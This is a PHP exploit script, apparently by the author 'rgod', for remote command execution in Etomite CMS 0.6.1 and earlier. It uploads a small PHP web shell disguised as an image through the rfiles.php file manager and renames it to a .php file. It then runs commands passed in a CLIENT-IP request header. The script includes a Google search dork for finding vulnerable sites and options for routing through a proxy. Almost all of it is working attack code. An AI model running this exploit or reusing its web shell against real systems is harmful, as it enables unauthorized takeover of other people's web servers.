#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;Etomite CMS &lt;= 0.6.1 &#039;rfiles.php&#039; remote command execution\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n&quot;;
echo &quot;google dork: \&quot;Content managed by the Etomite Content Management System\&quot;\r\n\r\n&quot;;

/*
works regardless of php.ini settings
*/

if ($argc&lt;4) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path cmd OPTIONS\r\n&quot;;
echo &quot;host:      target server (ip/hostname)\r\n&quot;;
echo &quot;path:      path to etomite\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /etomite/ \r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost / -P1.1.1.1:80\r\n&quot;;
die;
}

/*
software site: http://www.etomite.org/

explaination:

if you can call directly rfiles.php script you can upload an image file, then
you can rename it with .php extension, so you launch commands...

*/

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
	}
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

function make_seed()
{
   list($usec, $sec) = explode(&#039; &#039;, microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd=&quot;&quot;;
$port=80;
$proxy=&quot;&quot;;
for ($i=3; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}

if (($path[0]&lt;&gt;&#039;/&#039;) or ($path[strlen($path)-1]&lt;&gt;&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

srand(make_seed());
$anumber = rand(1,999);

$valid = array(&#039;gif&#039;, &#039;jpg&#039;, &#039;jpeg&#039;, &#039;png&#039;);
for ($i=0; $i&lt;count($valid); $i++)
{
$data=&#039;-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;lang&quot;

en
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;param&quot;

upload
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;flist&quot;

1
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;cimg&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;ilibs&quot;

/
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;randomParam&quot;

&amp;w=150&amp;h=150&amp;zc=1
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;popClassName&quot;

default
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;popTitle&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;in_srcnew&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;in_dirnew&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;nfile[]&quot;; filename=&quot;suntzu&#039;.$anumber.&#039;.php.&#039;.$valid[$i].&#039;&quot;
Content-Type:

&lt;?php set_time_limit(0);echo &quot;my_delim&quot;;passthru($_SERVER[&quot;HTTP_CLIENT_IP&quot;]);echo &quot;my_delim&quot;;?&gt;
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;chkThumbSize[0]&quot;

0
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;selRotate&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_title&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_alt&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_class&quot;

default
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_align&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_border&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_vspace&quot;


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_hspace&quot;

-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name=&quot;pr_captionClass&quot;

default
-----------------------------7d6341a4e0c5a--
&#039;;

$packet =&quot;POST &quot;.$p.&quot;manager/media/ibrowser/scripts/rfiles.php HTTP/1.0\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;manager/media/ibrowser/ibrowser.php\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d6341a4e0c5a\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
sleep(1);

$data=&#039;-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;lang&quot;

en
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;param&quot;

rename|suntzu&#039;.$anumber.&#039;.php.&#039;.$valid[$i].&#039;|suntzu&#039;.$anumber.&#039;.php
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;flist&quot;

1
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;cimg&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;ilibs&quot;

&#039;.$path.&#039;manager/media/ibrowser/temp/
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;randomParam&quot;

&amp;w=150&amp;h=150&amp;zc=1
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;popClassName&quot;

default
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;popTitle&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;in_srcnew&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;in_dirnew&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;nfile[]&quot;; filename=&quot;&quot;
Content-Type: application/octet-stream


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;chkThumbSize[0]&quot;

0
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;selRotate&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_title&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_alt&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_class&quot;

default
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_align&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_border&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_vspace&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_hspace&quot;


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name=&quot;pr_captionClass&quot;

default
-----------------------------7d62f31919f0218--
&#039;;
$packet =&quot;POST &quot;.$p.&quot;manager/media/ibrowser/scripts/rfiles.php HTTP/1.0\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;manager/media/ibrowser/ibrowser.php\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62f31919f0218\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
sleep(1);

$packet =&quot;GET &quot;.$p.&quot;manager/media/ibrowser/temp/suntzu&quot;.$anumber.&quot;.php HTTP/1.0\r\n&quot;;
$packet.=&quot;CLIENT-IP: &quot;.$cmd.&quot;\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;my_delim&quot;))
{
$temp=explode(&quot;my_delim&quot;,$html);
echo &quot;exploit succeeded...\r\n&quot;;
die($temp[1]);
}
}
//if you are here...
echo &quot;exploit failed...&quot;;
?&gt;
